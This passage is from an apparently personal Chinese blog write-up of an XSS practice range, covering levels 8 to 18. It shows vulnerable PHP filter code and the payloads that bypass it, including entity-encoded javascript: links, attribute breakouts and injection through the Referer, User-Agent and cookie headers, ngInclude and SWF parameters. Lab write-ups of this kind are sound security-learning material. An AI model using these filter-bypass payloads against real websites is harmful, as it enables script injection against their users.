value=<span class="string">&quot;&#x27;.htmlspecialchars(<span class="subst">$str</span>).&#x27;&quot;</span>&gt;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;    </span><br></pre></td></tr></table></figure>
+
+<p>可以利用Level 3中所提的<strong>HTML实体编码</strong>，利用属性值绕过过滤</p>
+<p>字母的16进制HTML实体编码:<img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/07/23/10de141836dc809b3a421601ca0a32d9-image-20230723224012449-d8402c.png" alt="image-20230723224012449"></p>
+<p>输入:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java<span class="symbol">&amp;#x73;</span>cript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>点击下方链接即可</p>
+<blockquote>
+<ol>
+<li>该过程中字符串java&amp;#x73;cript:alert(1) 随着GET请求传递参数keyword</li>
+<li>php接收请求后将keyword赋值给$str 并不断过滤为$str7，</li>
+<li>此刻php返回响应其中href&#x3D;java&amp;#x73;cript:alert(1) </li>
+<li>浏览器接受响应然后HTML 解析其实体编码 将其变成了href&#x3D;javascript:alert(1);</li>
+</ol>
+</blockquote>
+<h1 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h1><p>输入<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> ，<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a> 以及 java&#x73;cript:alert(1) <img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/ba0593442bc77f928553269aae214a16-image-20230807182629618-4739e4.png" alt="image-20230807182629618"></p>
+<p>输入<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a> ， <a target="_blank" rel="noopener" href="http://www.baidu.comhttp//">www.baidu.comhttp://</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/10/c433fcd211a09ed0b8de49e5f8ddc19a-image-20230810220945625-85ebd1.png" alt="image-20230810220945625"><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/10/46a27660b2343c064517dfd932b9c0bf-image-20230810221004766-f1e0d1.png" alt="image-20230810221004766"></p>
+<p>可以推测 会对链接进行检查，并且只需要有”http:&#x2F;&#x2F;“字段即可</p>
+<p>尝试直接在其中加入XSS注入相关字段<img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/25861d5d134958c76953f1e1a52db575-image-20230807182820000-39d2a6.png" alt="image-20230807182820000"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/351b94d9ace192942bc64c1365cf417c-image-20230807182838047-16884e.png" alt="image-20230807182838047"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/b694623456ea84e07232f968b307ed6c-image-20230807183001226-381862.png" alt="image-20230807183001226"></p>
+<p>由此观之 该网页也对相关字段进行了过滤</p>
+<p>可以使用HTML实体编码尝试绕过过滤:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/7315084e096f2ab85a91e0237443681b-image-20230807183059654-d5aae9.png" alt="image-20230807183059654"></p>
+<p>输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java<span class="symbol">&amp;#x73;</span>cript:alert(<span class="symbol">&amp;#x22;</span>http://<span class="symbol">&amp;#x22;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h1><p>HTML部分源码有：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;search&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该网页存在3个<strong>隐藏变量</strong>，分别尝试有GET请求给这三个变量赋值1，其中t_sort会回显到页面中，以此为注入点</p>
+<p>注入:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h1><p>观察HTML部分源码:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://test.ctf8.com/level10.php?t_sort=1%22%20type=%22text%22%20onclick=%22alert(1)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>疑似获取了refer字段，使用burpsuit抓包</p>
+<p>更改图示内容为1：<img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/c663e185f503970dd4149803245cc337-image-20230825231823810-eb1e26.png" alt="image-20230825231823810"></p>
+<p>响应内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以以Referer为注入点，抓包将refer更改为下列字段后再将请求包发送过去:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/ba26bb007410e2d4a3794cfaa65f61db-image-20230825232143124-3dcffa.png" alt="image-20230825232143124"></p>
+<h1 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h1><p>部分HTML源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ua&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>推测可以修改User-Agent为注入点，同Level11一样，修改User-Agent值为:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/7f7d7a2929c569bb84d7be5f169138ad-image-20230825232543963-8be874.png" alt="image-20230825232543963"></p>
+<h1 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h1><p>部分HTML源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP部分源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br></pre></td></tr></table></figure>
+
+<p>尝试抓包更改cookie(Name&#x3D;user,Value为注入内容):</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>响应的HTML源码为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h1><h1 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ngInclude: undefined --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用get请求发送scr&#x3D;1后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ngInclude: 1 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ng-Include属性可以包含一个外部文件，返回一个文件名，因此这里的ngInclude可能可以包含外部文件 </p>
+</blockquote>
+<p>用get请求发送scr&#x3D;’level1.png’后：<img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/09/05/092b5d9058e68045402e702733e0d6e1-image-20230905075546572-7cad90.png" alt="image-20230905075546572"></p>
+<p>加载了png文件，因此ngInclude包含外部文件</p>
+<p>尝试包含level1.php文件并对其也进行xss注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;ng-include:&#x27;level1.php?name=&lt;script&gt;alert()&lt;/script&gt;&#x27; ng-scope&quot;</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">&quot;border:0px&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/x-scriptlet&quot;</span> <span class="attr">data</span>=<span class="string">&quot;http://xss.tv/themes/default/templates/head.html&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span>欢迎用户<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;level1.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ng-scope&quot;</span>&gt;</span>payload的长度:24<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>并没有触发alert()，更换payload为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/09/05/84db365701d1c8141adf61c3e637e61b-image-20230905080846085-ccf7fc.png" alt="image-20230905080846085"></p>
+<p>点击图片标志即可触发，如果将事件属性更改为onerror，则可以自动触发并执行alert(1)</p>
+<h1 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>test<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload疑似直接回显在界面中，尝试XSS注入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="tag">&lt;<span class="name">sCRipt</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">sCRIpt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>&amp;nbsp;为不换行空格的实体代码</p>
+</blockquote>
+<p>使用onerror属性，并用%0a代替空格</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;%27</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;xsf01.swf?a=b&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">heigth</span>=<span class="string">&quot;100%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>embed标签用来嵌入外部多媒体内容(包括flash插件)</li>
+<li>swf文件是flash相关的多媒体文件格式</li>
+<li>该输出点接受来自URL参数 <code>arg01</code> 和 <code>arg02</code> 的值，并将它们插入到SWF文件的URL中</li>
+</ul>
+</blockquote>
+<p>直接注入arg02即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02=b%20onkeydown=alert()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>onkeydown为按下键盘按键触发</p>
+</blockquote>
+<h1 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//Level17和Level18源码对比</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码一样，注入Level17同样的payload即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02=b%20onkeydown=alert()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/BurpSuite/" rel="tag"># BurpSuite</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/09/09/DVWA/" rel="next" title="DVWA">
+      DVWA <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-1"><span class="nav-number">1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-2"><span class="nav-number">2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-3"><span class="nav-number">3.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-4"><span class="nav-number">4.</span> <span class="nav-text">Level 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-5"><span class="nav-number">5.</span> <span class="nav-text">Level 5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-6"><span class="nav-number">6.</span> <span class="nav-text">Level 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-7"><span class="nav-number">7.</span> <span class="nav-text">Level 7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-8"><span class="nav-number">8.</span> <span class="nav-text">Level 8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-9"><span class="nav-number">9.</span> <span class="nav-text">Level 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-10"><span class="nav-number">10.</span> <span class="nav-text">Level 10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-11"><span class="nav-number">11.</span> <span class="nav-text">Level 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-12"><span class="nav-number">12.</span> <span class="nav-text">Level 12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-13"><span class="nav-number">13.</span> <span class="nav-text">Level 13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-14"><span class="nav-number">14.</span> <span class="nav-text">Level 14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-15"><span class="nav-number">15.</span> <span class="nav-text">Level 15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-16"><span class="nav-number">16.</span> <span class="nav-text">Level 16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-17"><span class="nav-number">17.</span> <span class="nav-text">Level 17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-18"><span class="nav-number">18.</span> <span class="nav-text">Level 18</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="毕竟留了一手"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">毕竟留了一手</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/yourname" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-毕竟留了一手"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">毕竟留了一手</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
